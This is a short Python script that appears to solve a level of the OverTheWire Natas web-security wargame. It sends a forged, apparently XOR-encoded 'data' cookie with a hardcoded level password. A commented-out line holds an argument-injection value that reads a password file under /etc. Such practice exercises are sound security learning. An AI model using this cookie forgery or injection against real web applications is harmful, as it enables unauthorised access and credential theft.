#!/usr/bin/env python

import requests
import json


NATAS = "natas11"
PASS = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
URL = "http://" + NATAS + ".natas.labs.overthewire.org"
jar = requests.cookies.RequestsCookieJar()
jar.set(name='data', value='ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK:')
r = requests.get(URL , auth=(NATAS, PASS), cookies=jar)
#r = requests.post(URL , auth=(NATAS, PASS), data={'needle': '-v test /etc/natas_webpass/natas11 ', 'submit': True })
print(r.text)
print(r.history)
print(r.status_code)


print(r.headers)
